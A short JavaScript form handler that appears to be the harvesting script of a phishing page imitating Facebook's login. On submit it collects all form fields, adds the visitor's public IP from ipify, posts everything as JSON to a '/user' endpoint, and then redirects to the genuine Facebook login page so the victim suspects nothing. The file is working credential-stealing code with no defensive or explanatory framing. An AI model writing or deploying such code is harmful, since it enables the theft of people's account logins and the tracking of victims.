const form = document.querySelector("form");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    const formData = new FormData(form);
    const d = Object.fromEntries(formData);
    const data = { "IP address": ip, ...d };

    await fetch("/user", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });

    window.location.href = "https://www.facebook.com/fr/login";
  } catch (error) {
    console.error(error);
    window.location.href = "https://www.facebook.com/fr/login";
  }
});
